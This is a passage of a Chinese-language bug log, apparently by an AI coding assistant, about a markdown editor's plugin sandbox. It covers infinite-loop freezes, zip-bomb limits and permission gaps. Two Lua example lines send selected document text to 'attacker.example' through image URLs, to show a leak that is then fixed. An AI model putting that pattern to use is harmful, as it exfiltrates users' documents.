变异：给中文加一节，点名 `README_zh-CN.md`；给英文加一节，十一份全部报出；把标题正则改成 `^#### `，报「只数出 0 个二级标题」。

**这一条差点没留下来。**跑完变异我用 `git checkout` 还原文件——本项目记过「变异还原只用 cp」，而我把它写成了 `git checkout … && echo "（这个文件本轮有改动，不能 checkout）"`，那句提示的措辞让输出读起来像是拒绝执行，实际它是执行成功之后打印的。本轮未提交的这一条就这么没了，重放脚本才补回来。记忆已更新。

---

## 审计：守卫自己的盲区，七个文件里它看得见三个

不是缺陷记录——查下来七个文件的 skip 全都正确。记在这里是因为**守卫的存在会让人以为这类问题被管住了**，而它管住的不到一半。

### 它防的是什么

`repo_dependent_tests_test` 防「本地全绿、CI 全红」：读兄弟仓库的测试必须带 `skip`，否则在没有那个仓库的机器上不是「跳过」而是 `LateInitializationError`。它的注释写着「这已经发生过两次」。

### 入口条件是一句字面量

```dart
if (!source.contains('final present = repo != null;')) continue;
```

**换个变量名就静默放行。**实际读兄弟仓库的测试文件有七个，含这句的只有三个。另外四个——`sdk_examples_test`、`sdk_definitions_test`、`plugin_declares_what_it_uses_test`、`packaged_plugin_test`——各自把路径存进了自己命名的变量，守卫从来没检查过它们。

### 为什么不能直接放宽判据

严格判据是「test 数 == skip 数」，它成立的前提是**文件里每个用例都需要 skip**。`sdk_definitions_test` 有四个用例，只有三个带 skip——第一个只读本仓库的 `lib/services/plugin_script_runtime.dart`，**本来就不该 skip**。直接把入口放宽会把它误报成违规。

要精确判断「这一个用例读没读兄弟仓库」，得解析每个 test 的 body 找路径变量，而变量名不定。

### 所以加的是一道下限，不是放宽

```dart
if (source.contains('marktext-plus-plugins') && !source.contains('skip:')) {
  offenders.add('…读了兄弟仓库，但一个 skip 都没有');
}
```

抓的是「整个文件都忘了 skip」这一种，对七个文件全部生效，零误报。严格那一半保持原样，只对写成那个惯用形状的文件生效——**覆盖面由前者提供，精度由后者提供**，两者的边界写进了注释，免得下一个人以为它管着所有文件。

变异：把 `sdk_examples_test` 的八个 skip 全删（守卫原本看不见这个文件），点名它；删掉 `ai_translate_plugin_test` 的一个 skip，报「34 个用例，只有 33 个带 skip」。

### 一件相关的事

这个守卫防的主要灾难，今天下午已经被另一件事消掉了大半：CI 现在会 checkout 那两个兄弟仓库，所以「CI 上没有仓库」不再是常态。它现在防的是开发者本机缺仓库的情形，以及 checkout 本身失败的情形——后者会明确报错，不再伪装成 `LateInitializationError`。

### 涉及文件

`test/repo_dependent_tests_test.dart`

---

## BUG-294：一个死循环的脚本插件会永久冻住编辑器

**状态：已定位并验证，修法需要架构改动，等人拍板。**

### 现象

一个 Lua 插件写成这样：

```lua
function on_command(ctx) while true do end end
```

点一下它的菜单项，编辑器**永久无响应**，只能强杀进程。

### 验证

```dart
PluginScriptRuntime('function on_command(ctx) while true do end end')
    .runCommand(const PluginScriptContext(command: 'c'));
```

用 `timeout 45 flutter test` 包着跑，45 秒后被 SIGTERM 杀掉。**连 `flutter test` 自己的 30 秒用例超时都没能中断它**——同步死循环不可中断，这一点本身就说明了问题的性质。

### 严重性：P1，不是 P0

`plugin_manager.loadInstalled()` 只读 `manifest.json`，**不求值脚本**；脚本是 `_runtimeFor(manifest)` 在第一次运行命令时才创建的。所以这不是「装上就打不开」，而是「点了那个命令才冻」，强杀之后重启一切正常，只要不再点它。

### 根因，以及为什么不能就地修

`plugin_command_service.dart:48` 同步调用 `runCommand`，**没有 isolate**。脚本在 UI isolate 上跑到底。

同 isolate 内没有任何办法中断它：

- **看门狗 Timer 不行**——UI isolate 被占死，回调根本不会执行
- **lua_dardo 没有钩子**——执行循环是 `lua_state_impl.dart` 里私有的 `for (;;) { fetch(); ... }`，0.0.5 不提供 `sethook` 或指令计数
- **flutter_js 没有暴露 QuickJS 的中断处理器**——只有 `setTimeout` 的模拟和 promise 的超时
- **在宿主注入的回调里检查耗时也不行**——`while true do end` 一个宿主函数都不调用

### 三个运行时里，只有一个有保护

这是一处典型的兄弟分支不一致：

| 运行时 | 超时 |
|---|---|
| `process`（独立进程） | **5 秒**，`plugin_process_host.dart:83`，注释写着「超时后只终止那个子进程」 |
| `lua` | 无 |
| `js` | 无 |

写 process 那条的人**明确想过这个问题**，只是没有把同一个约束带到脚本运行时——而脚本运行时恰恰是唯一跑在 UI isolate 上的那个。

### 修法的方向

把脚本执行搬进 isolate，加 timeout，超时 kill。它可行的原因是**宿主注入的三样东西都是纯数据，可以预先传进去**：`storage` 是一张表、`t` 是一张表、`require` 读的是插件目录里的文件。不需要跨 isolate 往返。

代价是 `runCommand` / `onResult` 从同步变成异步，调用链要跟着改。

### 为什么这一轮没有动手

它改的是插件执行的核心路径，而插件功能是这个项目反复出过问题、并且明确要求人工测试之后才能发的部分。在 v1.6.2 还没发出去的时候把它翻掉，是把一个「点了才冻」的已知问题换成一片未经测试的新代码。

**这条留给人来定什么时候做。**

### 涉及文件（如果要修）

`lib/services/plugin_script_runtime.dart`、`lib/services/plugin_js_runtime.dart`、`lib/services/plugin_command_service.dart`，以及它们的调用链

---

## BUG-295：SDK 文档向插件作者承诺了一个不存在的保护

上一条（BUG-294）是编辑器的缺陷。这一条是**文档就此说了假话**，而且说给的正是最需要知道真相的人。

### 两处

SDK README 的「安全须知」第三条：

> 工作要有边界；**编辑器有超时和步数上限。**

编辑器没有——对脚本插件而言一个都没有。插件作者读到这句会以为自己被兜着，于是不小心写出的死循环不算事。

第二处更绕，在论证「为什么编译型插件要用独立进程」那段：

> 之所以**安全**是因为它们是被解释执行的：脚本出错抛的是编辑器能接住的异常。原生代码没有这道边界。……**死循环会冻结窗口且无法打断**；……

它把「死循环冻住窗口」列为**原生代码独有**的代价，而脚本有一模一样的问题。解释执行这道边界是真的——它把「脚本出错」变成一条消息而不是一次崩溃——但它对「脚本永不返回」毫无作用。

### 修

第一处改成说真话：脚本跑在编辑器自己的线程上，没有东西能打断；只有编译型插件有超时，因为只有它们是独立进程。

第二处**改而不是删**：那段的价值恰恰在于说清这道边界哪一半成立、哪一半不成立。所以保留「解释执行接住错误」这一半，点明它盖不住永不返回的脚本，再把原生代码独有的那些（段错误、栈溢出、`abort()`、卸载不可靠）单独成段。

十二种语言全部同步，SDK 的结构检查确认翻译与英文的形状仍然一致。

### 涉及文件

SDK 仓库：`README.md`、`docs/i18n/README_*.md`（11 份）、`CHANGELOG.md`

---

## BUG-296：插件 ZIP 防住了路径穿越，没防住体积

### 接着上一条的问法

BUG-294 是「一个插件能对编辑器做什么坏事」问出来的。同一个问法换个对象：**一个插件包能做什么坏事**。

`installZip` 里已经有一道检查：条目路径不能逃出插件目录。那说明写它的人想过恶意包这件事——**但只想到了一面**。

原来的代码没有任何体积限制：

- ZIP 文件本身多大都读进内存（`readAsBytes`）
- 条目有多少个都不管
- 每个条目解压成多大都不管（`file.content` 就地解压进内存）

**这就是 zip bomb 的入口。**经典的 `42.zip` 是 42 KB，解压出 4.5 GB。

### 验证：117 字节的包，声称自己解压后是 300MB

`archive` 包里，条目「声明的解压后大小」和「实际内容」是两个独立的字段：

```dart
ArchiveFile('bin/bomb', 300 * 1024 * 1024, [1, 2, 3])
```

编码出来的 ZIP 是 **117 字节**，解码回来 `size` 仍然是 314572800。测试因此又快又真——它就是 zip bomb 的形状。

### 好消息：解压是惰性的

`ArchiveFile.content` 的实现是 `if (_content == null) decompress()`，所以 `decodeBytes` 只解析条目表，不解压内容。**声明的大小可以在解压之前读到**，这正好是拒绝它所需要的东西。

### 三层

| 检查 | 在哪一步 | 挡的是 |
|---|---|---|
| ZIP 文件 ≤ 64 MB | `readAsBytes` **之前** | 整个包撑爆内存 |
| 条目数 ≤ 10000 | 解析条目表之后 | 百万个小文件 |
| 声明的解压大小，单个与累计 ≤ 256 MB | 读 `content` **之前** | zip bomb 本体 |
| 实际写出的字节累计 ≤ 256 MB | 每次写盘之后 | ZIP 头撒谎 |

数字取得宽松：脚本插件是几十 KB，最大的真实情形是编译型插件带三个平台的可执行文件，几十 MB。

### 变异，以及一个杀不死的

| 变异 | 结果 |
|---|---|
| 去掉「声明大小」检查 | 挂 ✓ |
| 去掉条目数检查 | 挂 ✓，而且耗时从 2 秒变成 **29 秒**——它真的去写了一万个文件 |
| 去掉「实际写出」的累加 | **全绿** ✗ |

第三条杀不死，因为**没有测试能覆盖它**：要构造一个「头声明得比实际小」的包，就得真的产生超过 256 MB 的数据。

这一层**保留**，并在代码里写明它没有测试覆盖以及为什么。它和今天早些时候删掉的那条 `slot` 断言不是一回事——那是**测不出东西的断言**（期望值等于默认值），这是**测不起的真实防御**。第一层信的是攻击者自己写的数字，所以需要第二层兜着。

### 同一个问法下还查了什么

一并查过、**结论是不改**的：

| 问题 | 结论 |
|---|---|
| 打开一个几 GB 的文档 | 没有上限，而且**不该有**——「支持大文件」是这个编辑器的卖点。高亮器有 `maxHighlightedLength`，超过就停止上色但保留文本；解析是分片的。尽力而为是对的设计 |
| 插件 `storage` 无限写入 | 确实没有上限：`flush` 把整张表 `jsonEncode` 写盘。但它要恶意插件**加上**用户反复触发命令，后果是磁盘慢慢变满，比一次安装就能撑爆的 zip bomb 轻一个量级。而且「拒绝写入」要决定插件怎么知道、读者怎么知道，牵进 UI。记在这里，没有动 |
| 恶意 manifest（超长字符串、上万个菜单项） | ZIP 现在有 64 MB 上限，manifest 也在其中，所以有了一个粗的天花板。更细的限制等有人真的踩到 |

### 涉及文件

`lib/services/plugin_manager.dart`；`test/services/plugin_manager_test.dart`

---

## 手工测试反馈：一次跑出七条

**这一批全部来自人工测试**，不是构造出来的极端输入。值得记一句：前一天挖了整天静态形状，产出递减到我自己都建议停手；一轮真实使用挖出七条，其中两条 P1。

---

## BUG-297：「发现社区插件」把限流和断网都显示成「没有插件」

### 现象

插件面板报一条错（见下），并且「发现社区插件」搜出来是空的。

### 两件事，只有一件是缺陷

报的那条错是**对的**：

```
com.sugarfatfree.ai-translate: a plugin cannot ship Dart source
```

那个 id 不是本仓库的官方插件（官方的是 `com.marktextplus.ai-translate`），它的 entrypoint 指向 `.dart` 源码。编辑器不装 Dart SDK 也不能假设有，所以在安装时拒绝、并在插件页说明理由，正是 BUG-262 那批做的事。

**空列表才是缺陷。**

### 根因

「发现社区插件」搜 GitHub 上打了 `topic:marktext-plus-plugin` 的仓库，**再为每个结果单独请求一次 releases**。搜索用的是 `/search/repositories`（未认证十次一分钟），releases 用的是普通 API（未认证六十次一小时）——**后者先耗尽**。

而那个请求失败时是：

```dart
if (releaseResponse.statusCode != HttpStatus.ok) continue;
```

限流、代理拒绝、断网，全都变成静默跳过，最后返回空列表。读者看到的是「没有插件」，于是去找编辑器的毛病，而答案是「等一分钟」。

同一个函数里，**搜索请求有 `_describeFailure`，注释还专门讲了限流要说清楚**；releases 请求什么都不说。又一次兄弟分支没跟上。

### 修

收集每次拒绝的原因，`refusalFor` 决定要不要开口：

| 找到 | 被拒 | 结果 |
|---|---|---|
| 0 | 有 | **报出第一条原因**（限流／代理／断网） |
| 0 | 无 | 静默空列表——SDK 仓库自己带着这个 topic 却不发布插件，那是真的没有 |
| 有 | 有 | 不打扰——读者拿到了列表，少一个仓库不是他能处理的事 |

判断提成了纯函数来测；收集那三行是显而易见的代码。

---

## BUG-298：插件设置页把多行提示词的第二行起全藏了

### 现象

「纠错·用户提示词」里只有 `Text:`，看不到要翻译的原文变量。

### 根因

那个设置的默认值是 `"Text:\n{{text}}"`——**变量在第二行**。而设置页的 `TextField` 没有设 `maxLines`，Flutter 默认单行，换行之后的内容一个字都不显示。

六个提示词（三个 system、三个 user）全是多行的，所以每一个都只看得见第一行。**提示词是这个页面存在的理由**，而页面把唯一值得编辑的部分藏了起来。

### 修

文本字段跟着内容长：`minLines: 3, maxLines: null`。密码和数字仍是单行——`obscureText` 要求单行，而 key 本来也就一行。

---

## BUG-299：插件声明了图标，侧边栏仍画通用插件方块

### 根因不在插件

插件的 manifest 里写着 `"icon": "edit_note"`。问题在编辑器：Flutter 会 tree-shake 图标字体，**`Icons` 不能用字符串索引**——一个图标只有在某行 Dart 代码提到它时才会进构建产物。所以编辑器保存了一张表，而那张表只有七个名字：

```
list, translate, search, settings, build, info, bookmark
```

`edit_note` 不在其中，落到兜底的 `Icons.extension`——一个写作工具在侧边栏画成通用插件方块，而插件那边什么都没做错。

### 修

表提到 `lib/ui/widgets/plugin_icons.dart`，四十来个 Material 名字，按用途分组（写作、语言、模型、结构、文件、工具、时间与状态）。名字用 Material 自己的拼法，插件作者可以直接在 fonts.google.com/icons 上挑。

兜底保留：名字不认识仍给一个方块，**因为一个打不开的面板比一个通用图标更糟**。

加了一条测试：官方插件 manifest 里声明的每个图标，都必须在表里。删掉 `edit_note` 就点名它。

---

## BUG-300：AI 写作的六个建议在每种语言里都是英文

记在插件仓库的 CHANGELOG 里：六个建议写成了英文句子而不是 `locales` 键，所以读者拿到的是「日语的问题、英语的选项」。已改成键，十二种语言。

---

## BUG-301：悬浮卡片只能在文档那一格里拖动

### 现象

选中一段文字、右键「AI 写作」，弹出的卡片只能在标签页的某一个宫格内移动，拖不到别处。

### 根因

`PluginTipLayer` 被放在 `PluginPanes` 的 `document:` 参数里——也就是**文档那一格的内部**。它的 `Stack` 只覆盖那一格，`Positioned` 的可行范围自然也就是那一格。

代码里写着为什么这么放：「它是关于这段文字的回答，盖住某个窗格自己的标题栏就是盖住了别人的工作」。这个考虑是真的，但它换来的是一张只能在四分之一个标签页里挪的卡片——**想把它挪到不挡事的地方，就撞墙**。

### 修

提到 `Scaffold` 的 `body` 最外层，覆盖整个窗口。

两个顾虑哪个优先，是读者的事：**移动它的人是读者，挡住了他们自己会挪开**。

### 涉及文件

`lib/ui/screens/home_screen.dart`

---

## BUG-302：右侧边栏抽屉里的插件问不了问题，也就没法用

### 现象

新开一个标签页，点右侧边栏的「AI 写作」，抽屉里没有输入框——**没法说要写什么**。

### 根因

抽屉运行插件命令用的是一个专门的入口 `textFor`，它只跑**一步**，然后把结果当文本画出来。遇到需要交互的动作，它返回的是一句话：

```dart
PluginAskAction(:final label) =>
  '${plugin.name}: $label — a panel cannot ask a question',
PluginAiAction() =>
  '${plugin.name}: a panel cannot wait for the model',
```

而 AI 写作在没有 `answer` 时返回的**正是** `ask`——写作总得先说写什么。所以抽屉里出现的是「a panel cannot ask a question」，一个输入框都没有。

右键菜单那条路走的是 `_run`，它驱动完整流程：提问、调模型、显示结果。**两条路，一条能用一条不能用。**

### 修：一条流程，两个出口

没有把 `_run` 的逻辑复制一份到抽屉——那正是这个项目今天反复吃亏的形状。给 `_run` 加了一个出口：

```dart
typedef PluginTextSink = void Function(String text, {bool append});
```

有它时，`show` / `panel` / `pane` 的文本交给调用方去画；**没有它时一切照旧**（卡片、宫格）。提问和模型调用**不重定向**——它们已经有地方了，就是那张悬浮卡片，而且不管命令是从菜单还是从图标栏启动的，都该是同一张。

于是：点图标 → 卡片问「要写什么」→ 回答 → 结果落在抽屉里。而那张卡片正好在这一轮被提到了整个窗口（BUG-301），所以它不会再被困在某一格里。

`textFor` 随之没有了调用者，删掉——54 行。

### 变异

把抽屉改回只跑一步，测试点名「面板不该再用一句话打发掉提问」。

新测试在 widget 树里放了 `PluginTipLayer`，因为问题是在那里被问出来的；这也更接近真实结构。

### 涉及文件

`lib/ui/widgets/plugin_command_actions.dart`；`lib/ui/widgets/right_side_bar.dart`；`test/ui/widgets/right_sidebar_test.dart`

---

## BUG-303：插件不申请 `network.request` 也能让宿主替它发出站请求

### 现象

一个只声明了 `document.read` 的插件——读者最可能放行的那种组合，"能看我的文档，
但联不了网"——可以在自绘界面里放一个 image 节点：

```lua
sdk.ui.image("https://attacker.example/p.png?d=" .. selected_text)
```

宿主会老老实实把它取回来。文档内容跟着查询串一起出去了。

### 根因

`PluginImageLoader` 的类注释写着：

> A plugin may reach the network — that is what `network.request` grants

**但 `load()` 从来没有检查过这个权限**，这个类连插件的权限列表都拿不到。
构造点 `plugin_command_actions.dart` 也只传了目录和日志。

这是典型的 confused deputy：宿主有网络能力，插件只要能指定一个 URL，
就借到了这个能力。行为级的闸门（`plugin_command_service._guard`）拦的是**动作类型**
——`PluginUiAction` 要 `ui.sidebar`——而不是动作**内容**里的那个地址。

写下这段注释的时候我大概真的以为它成立。"A permission the reader cannot afterwards
check up on is a promise" 这句话就在调用点上方，而权限本身没有被读过一次。

### 修

`PluginImageLoader` 增加 `required bool allowNetwork`。**required 而不是给默认值**：
两个默认值都是错的——`true` 把网络给了没申请的插件，`false` 从申请了的插件手里拿走。
让每个构造点自己回答。

拒绝发生在**请求之前**，不是之后：URL 本身就是一条消息，先发出去再抛异常，
等于已经把要保护的东西交出去了。测试为此专门断言"服务器根本没被访问"，
而不只是断言抛了异常。

拒绝也写进插件日志。插件伸手去够一个它没有的权限，正是读者留着这份日志要查的事。

### 变异

拿掉 `if (!allowNetwork)` 整块：两条新测试失败——一条说"期望抛出，实际拿到了
[1,2,3]"，一条说日志里没有 refused。把调用点改成写死 `allowNetwork: true`：
新守卫 `plugin_network_is_gated_test` 失败。

### 一条守卫，不只是一次修复

`plugin_network_is_gated_test` 扫 `lib/` 里所有 `PluginImageLoader(` 的构造点，
要求每个都传了 `allowNetwork` **且它来自 `hasPermission`**。写死 `true` 会通过
其余全部测试——这一类错误只有守卫拦得住。

守卫自己也有两个坑，都踩了：构造函数的**声明**也匹配 `PluginImageLoader\(`
（用 `required this.` 排除），以及扫不到任何构造点时会静默通过（加 `isNotEmpty`）。

### 涉及文件

`lib/services/plugin_image_loader.dart`；`lib/ui/widgets/plugin_command_actions.dart`；
`test/services/plugin_image_loader_test.dart`；`test/services/plugin_network_is_gated_test.dart`

---

## BUG-304：`PluginPermission.withImplied` 写好了没人调

### 现象

manifest 里 `ui.webview` 的注释说得很清楚：

> Carries [networkRequest] with it, and the reader is told so

`implied` 表存在，`withImplied()` 实现正确。**`lib/` 和 `test/` 里都没有第二处引用。**
`hasPermission` 读的是原始 `permissions` 列表，安装对话框显示的也是原始列表。
所以声明了 `ui.webview` 的插件，`hasPermission('network.request')` 答 false，
读者看到的清单里也没有那一行。

这是本仓库第六次出现「写好了却没接上」。前五例记在 `written-but-never-wired-up`。

### 修

两处，都是一行：`hasPermission` 经 `withImplied` 读；详情页的清单也经它。

两处都要改，缺一处就是另一种谎：只改 `hasPermission`，读者看到的清单比实际授予的少
（注释自己说这"比不给清单更糟"）；只改显示，清单说给了而检查说没给。

### 涉及文件

`lib/services/plugin_manifest.dart`；`lib/ui/screens/plugin_detail_view.dart`；
`test/services/plugin_manifest_test.dart`；`test/ui/screens/plugin_permissions_test.dart`

---

## BUG-305：权限清单里长句子横向溢出

### 现象

写 BUG-304 的展示测试时撞出来的，不是找出来的：`RenderFlex overflowed by 378 pixels
on the right`。`ui.webview` 的说明是"Open its own web page inside the editor,
which can reach any server (the editor logs where)"，88 个字符。

**最长的句子挂在最宽的权限上**——最需要读到它的读者，恰好是读不到的那个。

### 根因

`Wrap` 只在**子项之间**换行，从不在子项**内部**换行。每一条权限是一个
`mainAxisSize: min` 的 `Row`，里面的 `Text` 没有任何宽度约束，于是整行冲出面板。

短句子看起来一切正常，所以这个布局从写下那天起就一直在等一条足够长的说明。

### 修

改成一行一条，`Text` 放进 `Expanded` 里自然折行；对勾用 `crossAxisAlignment.start`
加 2px 上边距，与两行句子的第一行对齐。

权限清单本来就是要被逐条读的东西，一行一条也更接近应用商店的惯例。挤两条半句在一行、
第三条冲出屏幕，并不比一行一条更好读。

### 变异

把布局改回 `Wrap`：「a permission another one carries is shown too」和
「a long sentence wraps rather than running off the edge」两条同时失败。
后者把窗口设成 360×640——面板是可以拖窄的，而 768 下只有 webview 那条会溢出。

### 涉及文件

`lib/ui/screens/plugin_detail_view.dart`；`test/ui/screens/plugin_permissions_test.dart`

---

## BUG-306：`Image.network` 和 `package:http` 不走系统代理

### 现象

在代理后面（本项目作者的环境就是），文档里的 `![](https://…/pic.png)` 从来加载不出来，
预览显示的是错误色的 `[alt 文本]`。**这看起来像链接坏了，而不像一个从没生效的设置。**
更新检查同样静默失败。

### 根因

`ai_connection_service`、`ai_chat_service`、`plugin_catalog_service`、
`plugin_image_loader` 四处都规规矩矩写了：

```dart
client.findProxy = (uri) => HttpClient.findProxyFromEnvironment(
  uri, environment: Platform.environment);
```

dart:io 的 `HttpClient` **默认不读 `http_proxy`**，所以这行不是装饰。而剩下两个出站点
根本没有调用点可以写这一行：

- `Image.network` 的 `HttpClient` 建在 Flutter painting 层深处（`_network_image_io.dart`
  的一个 static final）；
- `package:http` 的建在 `IOClient` 里面。

这正是 CLAUDE.md 里那条「一条规则被抄了好几份，其中一份没跟上」——只不过没跟上的两份
**不是忘了抄，是抄不到**。

### 修

`HttpOverrides` 是唯一能一次盖住全部的地方：`HttpClient()` 是个工厂，它先问 overrides。
`lib/core/net/system_proxy.dart` 里 40 行，`main()` 里一行装上。

**启动开销为零**：设一个 zone 值，不开 socket、不读文件。所以它不出现在启动 trace 里,
也不违反「秒启动」。

`proxyFor` 做成公开方法，因为 `HttpClient.findProxy` 只有 setter 没有 getter，
测试问不出一个 client 的决定。`no_proxy` 这条规则值得单独测——它最容易写错，
而且只有在代理后面访问内网主机时才看得出来。

原来那四处手写的 `findProxy` 保留不动：它们现在是和默认值一致，而不是唯一有代理的地方。

### 变异

把 `createHttpClient` 里的 `..findProxy = proxyFor` 拿掉：连接测试失败
（假代理服务器没被访问）。另有一条守卫断言 `main.dart` 里确实有
`HttpOverrides.global = SystemProxyHttpOverrides()`，**且在
`WidgetsFlutterBinding.ensureInitialized()` 之前**——"写好了没装上"是本仓库第六次
犯的错，一个从没赋值的 override 恰好以那种方式失败：单元测试全绿，运行时毫无变化。

### 涉及文件

`lib/core/net/system_proxy.dart`（新增）；`lib/main.dart`；
`test/core/net/system_proxy_test.dart`（新增）

---

## BUG-307：`markdown` 节点是同一扇门的第二个把手

### 现象

BUG-303 把 `image` 节点挡在了 `network.request` 后面。但插件还有第二种画图片的写法：

```lua
sdk.ui.markdown("![](https://attacker.example/p.png?d=" .. text .. ")")
```

`PluginUiMarkdown` 直接交给 `MarkdownRenderer`，后者走 `Image.network`——
**不查权限、不写日志、不走代理**（代理这一条已由 BUG-306 顺带解决）。

修完 BUG-303 才发现它，因为修法本身提出了这个问题：一个插件还能从哪里发出请求？
记忆里那条「改一个分支就读完它的兄弟」说的正是这个——横向读兄弟分支。

### 修：一个载体，不是一个开关加一个载体

第一反应是给 `MarkdownRenderer` 加个 `bool allowRemoteImages`。那样要把这个布尔值
从 `plugin_command_actions` 一路穿过 sink typedef、tip provider、右侧边栏，五个文件。
而且它只能"拒绝"，给不了日志和代理。

改成传**加载器本身**：`MarkdownRenderer.loadImage`，可空。文档传 null，行为一字不变；
插件传的正是 `image` 节点用的那个 `PluginImageLoader`——它已经检查权限、记主机名、走代理。
**两种写法得到同一个答案**，而且只动两个文件。

`_loadedPictures` 缓存把 `imageRevision` 折进了键：只用地址做键的话，
「重新加载图片」会重建 FutureBuilder 然后把它正想丢掉的那份字节交回去。

### 变异

`PluginUiView` 不传 `loadImage`：「a remote one goes through the editor, not
around it」失败（`Actual: []`）。另一条「a document is left alone」断言无加载器时
仍然走老路——widget 测试里网络图片必然失败，显示的 alt 文本就是老路的证据。

### 涉及文件

`lib/ui/editor/markdown_renderer.dart`；`lib/ui/widgets/plugin_ui_view.dart`；
`test/services/plugin_ui_test.dart`

---

## 审计：两套解析器写了同一份语法，没有任何东西让它们保持一致

不是缺陷记录——**这次审计没找到不一致**。写下来是因为它填的那个洞是真的。

### 起点：问"防灾难的设施建过哪些，新成员过关了吗"

`test/` 下有 60 多个对账/守卫类测试。挑那些**枚举成员**的看：新加的
`ui.webview` 权限、11 种 UI 节点、`PluginUiAction`，有没有哪一条守卫本该管它们
却漏了。

### 发现：`sdk_definitions_test` 只查了一个方向

它断言「Lua 运行时读的键 ⊆ 手写清单」。**反方向没查**，而且更要紧的是：
清单是手写在测试里的，没有和编辑器的节点类定义对账。

顺着摸下去发现更大的一件事：**编辑器有两套独立的树解析器**——
`plugin_script_runtime._readUiNode` 走 Lua 栈，`plugin_js_runtime.parseUiNode`
走解码后的 Map。11 种节点、每种若干字段，在两个文件里各写了一遍。
`parseUiNode` 的注释写着「同形，作者换语言别的都不变」。

而 `parseUiNode` **零直接测试覆盖**。整个测试套件里唯一碰过 JS 树的地方，
用了 11 种节点里的 2 种。

（写这段时我先搞错了一次，值得记下来：我以为整个 `plugin_js_runtime_test.dart`
都因 QuickJS 被跳过。实际只有「the engine runs a plugin end to end」一条带
`skip:`，其余都在跑，**JS 的动作解析覆盖得很好**。查证之前不要把猜测写进文档。）

**还有一条测试的名字在骗人**：`a JS action becomes the same thing a Lua action
does`——它从头到尾没有跑过 Lua 运行时，只是拿 JS 的结果对硬编码的期望值。
一个承诺了比较的名字，正是这个比较一直没人做的原因。已改名为
`a JS action parses into the action the editor performs`。

### 手工对账的结果：两侧是一致的

按节点类 × 具名参数逐项比对，`Lua 少的 []`、`JS 少的 []`、字段无差异。
动作层同样比了一遍（9 种动作 × 具名参数），也无差异。字符串字段的**类型严格性**
也一致：Lua 要求 `LuaType.luaString`，JS 要求 `is String`，`text = 42` 两边都不认。

前几轮的工作是有效的。**但没有任何东西保证下一个节点类型不会只加到一侧。**

### 修：让编译器来管这件事

新增 `plugin_ui_two_runtimes_test.dart`。同一份界面写两遍——一份 Lua table、
一份 JSON——各自过各自的解析器，然后比较。

比较用的 `describe` 是**对 sealed 类的穷尽 switch**：加第 12 种节点，
这个文件**编译不过**，而不是安静地放行。这比拿正则扫两份源码强得多，
也是把它放在测试里而不是写成源码扫描的理由。

第二条测试对账 fixture 本身：从 `plugin_ui.dart` 数出所有 `class PluginUi\w+
extends PluginUiNode`，要求每一个都出现在 fixture 里。否则第一条会在
「某个节点类型压根没被任何一侧读过」时保持绿色——那正是它要抓的漂移。

顺带把 JS 侧四条拒绝行为补上（无 id 的 input、无 source 的 image、超过 12 层、
超过 500 节点），它们此前一条都没测过。写的时候先把断言写成"返回非 Action"，
实际行为是**抛异常**——和 Lua 侧一致，是好消息，断言改对了。

### 变异

1. JS 的 `image` 忽略 `height` → 「the two runtimes read the same interface into
   the same tree」失败
2. JS 的 `select` 忽略 `value` → 同一条失败
3. fixture 里删掉 `markdown` 节点 → 「the fixture uses every node type there is」失败

三次都由**正确的那一条**测试报出。

### 涉及文件

`test/services/plugin_ui_two_runtimes_test.dart`（新增）

---

## BUG-308：提示词模板丢了变量，读者刚输入的东西静默消失

（在官方插件 `marktext-plus-ai-translate-plugin` 里。）

### 现象

六个提示词都是读者可改的设置——这正是 BUG-298 把它们从单行框改成多行框的理由。
读者去改「写作·用户提示词」，写了一版不含 `{{instruction}}` 的模板。

之后每一次 AI 写作：他们在提问框里输入的写作要求**原样消失**。系统提示词里还写着
"Follow the brief"，而 brief 一个字都没送过去。翻译同理——在下拉框里选了目标语言，
模板丢了 `{{language}}`，模型自己猜。

### 根因：兜底只建给了三个占位符里的一个

`build()` 里有这么一段，写得很清楚：

```lua
-- A template that forgot where the text goes still gets the text.
if values.text ~= nil and user:find("{{text}}", 1, true) == nil
    and system:find("{{text}}", 1, true) == nil then
  prompt = prompt .. "\n\n" .. values.text
end
```

**它的两个兄弟没有。** `{{instruction}}` 和 `{{language}}` 缺席时直接丢弃。

这是记忆里那条「改一个分支就读完它的兄弟」的又一例：规则只应用到了当时正在看的那一支。

**比报错更糟的是没有报错。** 模型收到缺变量的提示词照样会回答，所以界面上什么都不异常，
只是那个回答在答一个没人问过的问题。

### 修

`APPENDED` 是一张有序表（`instruction` → "Brief"，`language` → "Target language"）。
**有序**是因为 Lua 的 `pairs` 不保证顺序，同一条命令跑两次不该产出不同的提示词。

`text` 不在表里：它最后追加、不带标签，因为它是消息的主体而不是消息的一个字段。

`absent()` 同时检查系统提示词和用户提示词——读者把 `{{language}}` 从用户提示词
挪进系统提示词，不算丢了它。这一条是从原来的 `text` 检查里继承的，变异验证时
把它改成只看 user，打掉的是一条**既有**测试。

### 变异

1. 从 `APPENDED` 删掉 `language` → 「a template that forgets {{language}} still
   says which language」失败
2. `absent()` 只看 user 不看 system → 既有的「a translation template of their own
   is what gets sent」失败
3. 往模板里加一个没兜底的 `{{tone}}` → 两条新守卫同时失败

第 3 次第一遍是**无效变异**：Python 字符串里的 `\n` 变成了真换行，锚点没命中，
`assert old in s` 当场拦下。这正是那条记忆存在的理由。

### 两条守卫

- **每个占位符都要有兜底**：扫 `prompts.lua` 的非注释行取出所有 `{{...}}`，
  要求每个都是 `text` 或在 `APPENDED` 里。第四个占位符加进来而忘了兜底，
  会和这次修的两个一样安静
- **README 的占位符表要和代码对得上**：12 份 README 用表格向读者描述这些变量。
  表里多一个是空头承诺，少一个是读者永远想不到去用的字段

两条都排除注释行——文件自己的文档注释里也写了这些占位符，而注释坏不了事。

### 涉及文件

插件仓库：`lib/prompts.lua`、`CHANGELOG.md`、`README.md` 与 11 份翻译；
主应用：`test/services/ai_translate_plugin_test.dart`

---

## BUG-309：标题被留在上一批，正文另起一条请求

（在官方插件里。）

### 现象

翻译整篇文档时按块分批发送。`is_heading` 的注释写着标题「goes with the text
**under** it」——单独一行 `## Results` 不告诉模型语域也不告诉主题。

但规则只写了一半：

```lua
if size > 0 and size + length > budget and not is_heading(block) then flush() end
```

**标题永远不触发切分，所以它加入当前批次**——也就是它上面那一批。然后它下面的正文撑爆预算、
触发切分，于是标题跟着一个和它无关的段落走了，正文自己另起一条请求。

既有测试只覆盖了「标题是最后一块」的情况，那时它后面没有东西可分离。

### 修

`flush()` 切分时把结尾的连续标题**交给下一批**。

第一版把最后一次 flush 也这么写，结果打掉了那条既有测试——**最后一次不能"带走"**，
